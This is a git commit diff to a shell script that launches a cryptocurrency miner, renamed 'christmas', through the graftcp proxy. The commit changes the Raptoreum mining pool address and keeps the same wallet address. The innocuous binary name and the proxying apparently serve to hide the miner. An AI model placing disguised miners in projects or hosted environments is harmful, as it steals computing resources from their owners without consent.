7aaa015f9e077602a46743fa49825fef0e64a217
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-02-24 15:43:11 +0200

    Update start_Xmas_AzAz72_ws2.sh

--- start_Xmas_AzAz72_ws2.sh
+++ start_Xmas_AzAz72_ws2.sh
@@ -35,4 +35,4 @@ chmod +x christmas
 
 ph add christmas
 
-./graftcp/graftcp ./christmas -a gr -o stratum+tcp://raptoreumemporium.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz72 -p IhatePopUps
+./graftcp/graftcp ./christmas -a gr -o stratum+ssl://stratum-na.rplant.xyz:17056 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz72 -p IhatePopUps
